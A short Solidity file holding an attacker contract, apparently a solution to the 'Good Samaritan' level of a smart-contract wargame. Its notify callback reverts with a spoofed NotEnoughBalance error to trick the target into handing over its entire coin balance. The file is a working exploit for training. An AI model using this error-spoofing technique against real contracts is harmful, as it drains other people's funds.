// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "hardhat/console.sol";

interface IGoodSamaritan {
    function wallet() external view returns (address);

    function coin() external view returns (address);

    function requestDonation() external returns (bool);
}

interface ICoin {
    function balances(address) external view returns (uint256);
}

contract GoodSamaritanAttacker {
    error NotEnoughBalance();

    IGoodSamaritan target;

    constructor(address _target) {
        target = IGoodSamaritan(_target);
    }

    function attack() public {
        target.requestDonation();
    }

    function notify(uint256) external view {
        if (ICoin(target.coin()).balances(target.wallet()) > 0)
            revert NotEnoughBalance();
    }
}
